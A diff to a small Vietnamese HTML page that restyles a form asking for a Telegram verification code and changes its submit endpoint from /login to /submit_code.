@@ -3,14 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Đăng nhập Telegram</title>
+    <title>Nhập Mã Xác Thực Telegram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            padding: 50px;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        input[type="submit"] {
+            background: #4CAF50;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        input[type="submit"]:hover {
+            background: #45a049;
+        }
+    </style>
 </head>
 <body>
-    <h1>Đăng nhập vào Telegram</h1>
-    <form action="/login" method="POST">
-        <label for="code">Nhập mã xác thực (TELEGRAM_CODE):</label>
+
+<div class="container">
+    <h2>Nhập Mã Xác Thực Telegram</h2>
+    <form action="/submit_code" method="POST">
+        <label for="code">Mã Xác Thực:</label>
         <input type="text" id="code" name="code" required>
-        <button type="submit">Đăng nhập</button>
+        <input type="submit" value="Xác Nhận">
     </form>
+</div>
+
 </body>
 </html>
